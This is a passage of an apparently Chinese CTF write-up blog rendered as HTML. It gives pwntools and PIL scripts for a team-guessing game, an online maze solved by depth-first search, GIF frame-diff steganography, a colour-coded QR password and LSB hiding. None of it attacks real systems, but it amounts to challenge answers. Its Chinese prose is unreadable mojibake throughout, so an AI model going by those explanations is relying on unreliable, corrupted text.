class="number">1</span>:</span><br><span class="line">    p.sendafter(<span class="string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>,res[i],timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(res[i])</span></span><br><span class="line">    ss = p.recvuntil(<span class="string">&#x27;Game&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> ss==<span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        ss = p.recvuntil(<span class="string">&#x27;Play again? (y/n): &#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(ss)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;The result Blue Team&#x27;</span> <span class="keyword">in</span> ss:</span><br><span class="line">        res[i]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;The result Red Team&#x27;</span> <span class="keyword">in</span> ss:</span><br><span class="line">        res[i]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Play again? (y/n): &#x27;</span> <span class="keyword">in</span> ss:</span><br><span class="line">        p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        i = <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h3><blockquote><p>ä¸ƒæœˆè¢«å›°åœ¨äº†è¿·å®«é‡Œï¼Œåç§’åè¿·å®«çš„ç»ˆç‚¹å°±è¦æ°¸è¿œæ¶ˆå¤±äº†ï¼Œä½ èƒ½å¸®å¥¹èµ°å‡ºè¿·å®«å—ï¼Ÿ nc è¿æ¥</p></blockquote><p>è€è¿·å®«äººäº†ï¼ˆç–¯ç‹‚è¶…æ—¶~</p><hr><p>å‚è€ƒæ–‡ç« ï¼š <a href="https://blog.csdn.net/weixin_53622248/article/details/111826362"><strong>2020çºµæ¨ªæ¯è¿·å®«é¢˜wp</strong></a> ã€ <a href="https://blog.csdn.net/jark_/article/details/77532105"><strong>DFS</strong></a> </p><hr><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">s,x,y</span>):</span></span><br><span class="line">    <span class="keyword">if</span> mapx[x][y]==<span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> s</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(s)+<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> mapx[x][y]==<span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment">#wasd</span></span><br><span class="line">    <span class="keyword">if</span> vis[x][y]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    vis[x][y]=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> y==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> dfs(s + <span class="string">&#x27;w&#x27;</span>, x - <span class="number">1</span>, y):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment"># if dfs(s + &#x27;a&#x27;, x, y - 1):</span></span><br><span class="line">        <span class="comment">#     return True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s + <span class="string">&#x27;s&#x27;</span>, x + <span class="number">1</span>, y):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s + <span class="string">&#x27;d&#x27;</span>, x, y + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> dfs(s+<span class="string">&#x27;w&#x27;</span>,x-<span class="number">1</span>,y):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s+<span class="string">&#x27;a&#x27;</span>,x,y-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s+<span class="string">&#x27;s&#x27;</span>,x+<span class="number">1</span>,y):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s+<span class="string">&#x27;d&#x27;</span>,x,y+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29722</span>)</span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;###########\n&quot;</span>)</span><br><span class="line">mapx=[<span class="string">&quot;###########\n&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    mapx.append(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx[i])):</span><br><span class="line">        <span class="keyword">if</span> mapx[i][j]== <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            xx=i</span><br><span class="line">            yy=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">vis=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    vis.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">        vis[i].append(<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># print vis</span></span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>,xx,yy)</span><br><span class="line"><span class="comment"># p.recv(1024)</span></span><br><span class="line"><span class="comment">#1st finished</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;#####################\n&quot;</span>)</span><br><span class="line">mapx=[<span class="string">&quot;#####################\n&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    mapx.append(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx[i])):</span><br><span class="line">        <span class="keyword">if</span> mapx[i][j]== <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            xx=i</span><br><span class="line">            yy=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">vis=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    vis.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        vis[i].append(<span class="literal">False</span>)</span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>,xx,yy)</span><br><span class="line"><span class="comment"># p.recv(9999)</span></span><br><span class="line"><span class="comment"># p.sendafter(&quot;So, Let&#x27;s move on to the next level!\n&quot;,&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># print len(a)</span></span><br><span class="line"><span class="comment"># #2nd finished</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;###############################\n&quot;</span>)</span><br><span class="line">mapx=[<span class="string">&quot;###############################\n&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    mapx.append(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx[i])):</span><br><span class="line">        <span class="keyword">if</span> mapx[i][j]== <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            xx=i</span><br><span class="line">            yy=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">vis=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    vis.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">62</span>):</span><br><span class="line">        vis[i].append(<span class="literal">False</span>)</span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>,xx,yy)</span><br><span class="line">p.recv(<span class="number">9999</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;#####################################################################################################\n&quot;</span>)</span><br><span class="line">mapx=[<span class="string">&quot;#####################################################################################################\n&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    mapx.append(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx[i])):</span><br><span class="line">        <span class="keyword">if</span> mapx[i][j]== <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            xx=i</span><br><span class="line">            yy=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">vis=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    vis.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        vis[i].append(<span class="literal">False</span>)</span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>,xx,yy)</span><br><span class="line">p.recv(<span class="number">100000</span>)</span><br><span class="line">p.recv(<span class="number">100000</span>)</span><br></pre></td></tr></table></figure><h3 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h3><blockquote><p>ä½ èƒ½ä»GIFä¸­æ‰¾åˆ°å°è±†æ³¥éšè—çš„flagå—ï¼Ÿ</p></blockquote><p>é¦–å…ˆåˆ†ç¦»gifï¼Œç„¶åæ¯11å¸§ä¸ºä¸€ç»„ï¼Œå…±åˆ†æˆ41ç»„ï¼Œä¸éš¾å‘ç°æ¯ç»„å’Œç¬¬ä¸€ç»„çš„å¯¹æ¯”ä¸­æœ‰éƒ¨åˆ†åƒç´ rgbå€¼åªå·®1ï¼Œäºæ˜¯æˆ‘ä»¬æŠŠåƒç´ ä¸€æ ·çš„å˜ä¸ºç™½è‰²ï¼Œä¸ä¸€æ ·çš„ä¸ºé»‘è‰²ï¼Œè¿›è€Œå¾—åˆ°11å¼ å›¾ï¼Œå…¶ä¸­æœ€åçš„ä¸¤å¼ æ˜¯å‘Šè¯‰æˆ‘ä»¬å‰ä¹å¼ å›¾å¯¹åº”çš„ä½ç½®ï¼Œç„¶åæˆ‘ä»¬æŠŠå‰ä¹å¼ æ‹¼èµ·æ¥å¾—åˆ°datamartixç ï¼Œæ‰«ç å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021274567.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021256414212.png"></p><p>é™„ä¸Šä¸€äº›è„šæœ¬</p><ol><li>åˆ†ç¦»GIFï¼ˆPSï¼šä¹Ÿå¯åˆ©ç”¨å·¥å…·<strong>gifsplitter</strong>åˆ†ç¦»ï¼‰</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageSequence</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseGIF</span>(<span class="params">gifname</span>):</span></span><br><span class="line">    <span class="comment"># å°†gifè§£æä¸ºå›¾ç‰‡</span></span><br><span class="line">    <span class="comment"># è¯»å–GIF</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(gifname)</span><br><span class="line">    <span class="comment"># GIFå›¾ç‰‡æµçš„è¿­ä»£å™¨</span></span><br><span class="line">    <span class="built_in">iter</span> = ImageSequence.Iterator(im)</span><br><span class="line">    <span class="comment"># è·å–æ–‡ä»¶å</span></span><br><span class="line">    file_name = gifname.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="comment"># åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    pic_dirct = <span class="string">&quot;./gif/&quot;</span>.<span class="built_in">format</span>(file_name)</span><br><span class="line">    mkdirlambda = <span class="keyword">lambda</span> x: os.makedirs(</span><br><span class="line">        x) <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(x) <span class="keyword">else</span> <span class="literal">True</span>  <span class="comment"># ç›®å½•æ˜¯å¦å­˜åœ¨,ä¸å­˜åœ¨åˆ™åˆ›å»º</span></span><br><span class="line">    mkdirlambda(pic_dirct)</span><br><span class="line">    <span class="comment"># éå†å›¾ç‰‡æµçš„æ¯ä¸€å¸§</span></span><br><span class="line">    <span class="keyword">for</span> IMG <span class="keyword">in</span> <span class="built_in">iter</span>:</span><br><span class="line">        print(<span class="string">&quot;image %d: mode %s, size %s&quot;</span> % (index, IMG.mode, IMG.size))</span><br><span class="line">        IMG.save(<span class="string">&quot;./gif/IMG&quot;</span> + <span class="built_in">str</span>(index).zfill(<span class="number">5</span>) + <span class="string">&quot;.bmp&quot;</span>)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">parseGIF(<span class="string">&#x27;Just_a_GIF.gif&#x27;</span>)</span><br></pre></td></tr></table></figure><p>2.1. æå–11å¼ å›¾ç‰‡ï¼Œç„¶åæ‰‹å·¥æ‹¼æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    img1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;gif/IMG000&#123;&#125;.bmp&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(b).zfill(<span class="number">2</span>)))</span><br><span class="line">    x, y = img1.size</span><br><span class="line">    img = Image.new(<span class="string">&#x27;P&#x27;</span>, (y, y), <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        tmpimg = Image.<span class="built_in">open</span>(<span class="string">&#x27;gif/IMG00&#123;&#125;.bmp&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(b+<span class="number">11</span>* (a+<span class="number">1</span>)).zfill(<span class="number">3</span>)))</span><br><span class="line">        print(<span class="string">&#x27;gif/IMG00&#123;&#125;.bmp&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(b+<span class="number">11</span>* (a+<span class="number">1</span>)).zfill(<span class="number">3</span>)))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">                p1 = img1.getpixel((j, i))</span><br><span class="line">                p2 = tmpimg.getpixel((j, i))</span><br><span class="line">                <span class="keyword">if</span> p1 != p2:</span><br><span class="line">                    img.putpixel((j, i), <span class="number">0</span>)</span><br><span class="line">    img.save(<span class="string">&#x27;gifout/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(b + <span class="number">1</span>)))</span><br><span class="line">    plt.imshow(img)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure><p>2.2. ä¸€æ­¥åˆ°ä½.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># 7 1 6</span></span><br><span class="line"><span class="comment"># 9 3 4</span></span><br><span class="line"><span class="comment"># 5 2 8</span></span><br><span class="line">pasteArray = [<span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>]</span><br><span class="line">resultImage = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">83</span> * <span class="number">3</span>, <span class="number">83</span> * <span class="number">3</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> group <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    imageModel = Image.<span class="built_in">open</span>(<span class="string">&quot;./gif/IMG&#123;:05d&#125;.bmp&quot;</span>.<span class="built_in">format</span>(group))</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">83</span>,<span class="number">83</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    width, height = imageModel.size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(group + <span class="number">11</span>, <span class="number">451</span>, <span class="number">11</span>):</span><br><span class="line">        imageSlice = Image.<span class="built_in">open</span>(<span class="string">&quot;./gif/IMG&#123;:05d&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">if</span> imageModel.getpixel((y,x)) != imageSlice.getpixel((y,x)):</span><br><span class="line">                    print(y,x)</span><br><span class="line">                    print(imageModel.getpixel((y,x)), imageSlice.getpixel((y,x)))</span><br><span class="line">                    image.putpixel((y,x), (<span class="number">16</span>,<span class="number">63</span>,<span class="number">145</span>))</span><br><span class="line">    resultImage.paste(image, (((pasteArray[group] - <span class="number">1</span>) % <span class="number">3</span>) * <span class="number">83</span>, ((pasteArray[group] - <span class="number">1</span>) // <span class="number">3</span>) * <span class="number">83</span>, ((pasteArray[group] - <span class="number">1</span>) % <span class="number">3</span>) * <span class="number">83</span> + <span class="number">83</span>,((pasteArray[group] - <span class="number">1</span>) // <span class="number">3</span>) * <span class="number">83</span> + <span class="number">83</span>))</span><br><span class="line">    resultImage.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h3><blockquote><p>å°æ˜å»æ—¥æœ¬æ—…æ¸¸æ—¶ï¼Œå‘ç°äº†ä¸€å¼ è¢«æ ¸åºŸæ°´æ±¡æŸ“è¿‡çš„äºŒç»´ç ï¼Œä½ èƒ½ä»ä¸­å‘ç°ä»€ä¹ˆä¿¡æ¯å—ã€‚</p></blockquote><p>â¾¸å…ˆè¯»å–ä¸‹â¼†ç»´ç çš„é¢œâ¾Šï¼Œå‘ç°â¼†ç»´ç çš„é¢œâ¾Šé™¤äº†â½©â¾Šçš„å¤–éƒ½æ˜¯å•â¼€çš„ræˆ–gæˆ–bæœ‰å€¼ ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯asciiç ï¼Œä½†æ˜¯æœ‰ä¸å¯â»…å­—ç¬¦ï¼Œå°†èŒƒå›´é€‰å®šåœ¨32åˆ°128ä¹‹é—´ï¼Œç»Ÿè®¡ræˆ–gæˆ–bçš„å€¼åœ¨è¿™äº›åƒç´ é—´çš„æ•°é‡ï¼Œå¯ä»¥çœ‹åˆ°æœ‰è§„å¾‹ï¼ŒæŒ‰ç…§é™åºå°†è¿™äº›å€¼è½¬ä¸ºå­—ç¬¦æ’ä¸‹æ¥å¾—åˆ°keyå³ä¸ºå‹ç¼©åŒ…å¯†ç ï¼š<code>#R@/&amp;p~!</code> </p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;Nuclear wastewater.png&#x27;</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        p = img.getpixel((j,i))</span><br><span class="line">        <span class="keyword">if</span> p!=(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>):</span><br><span class="line">            res.append(p)</span><br><span class="line">print(res)</span><br><span class="line">l = res</span><br><span class="line">ll = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="keyword">if</span> j!=<span class="number">0</span>:</span><br><span class="line">            ll.append(j)</span><br><span class="line">print(ll)</span><br><span class="line">rr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ll:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">32</span>&lt;i&lt;<span class="number">128</span>:</span><br><span class="line">        rr += <span class="built_in">chr</span>(i)</span><br><span class="line">print(rr)</span><br><span class="line">rrr = Counter(rr)</span><br><span class="line">rrr = <span class="built_in">sorted</span>(rrr.items(), key = <span class="keyword">lambda</span> kv:(kv[<span class="number">1</span>], kv[<span class="number">0</span>]),reverse=<span class="literal">True</span>)</span><br><span class="line">print(rrr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rrr:</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">1</span>]!=<span class="number">100</span>:</span><br><span class="line">        print(i[<span class="number">0</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„<code>flag.txt</code>æ–‡æœ¬ä¸éš¾çœ‹å‡ºå¯èƒ½å­˜åœ¨é›¶å®½ï¼Œè¿›è€Œå¾—çŸ¥åº”è¯¥æ˜¯å…³äº<strong>Citrix</strong>ç›¸å…³çš„è§£å¯†æ–¹å¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210802121157746.png"></p><p>å¨å­ä¸Šæœä¸€ä¸‹å°±æœ‰äº†ï¼Œæœ€åé€šè¿‡ä¸¤æ¬¡è§£å¯†å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021080212554162.png"></p><h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><blockquote><p>æœ‰æ‰‹å°±è¡Œçš„éšå†™</p></blockquote><p>æ”¾å…¥stegä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¿¡æ¯ <code>There are somethings in G plane</code> ï¼Œäºæ˜¯æˆ‘ä»¬Gé€šé“lsbå¾—åˆ°å›¾ç‰‡è·å¾—ä¸€åŠçš„flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021080212500832.png"></p><p>åœ¨GitHubä¸Šæ‰¾åˆ°é‡åŒ–ç´¢å¼•è°ƒåˆ¶ç›¸å…³è„šæœ¬ <a href="https://github.com/pl561/QuantizationIndexModulation"><strong>QuantizationIndexModulation</strong></a>ï¼Œå¯¹å…¶ç¨ä½œä¿®æ”¹è·‘ä¸€ä¸‹å¾—åˆ°å¦ä¸€åŠflag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021266398.png"></p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td 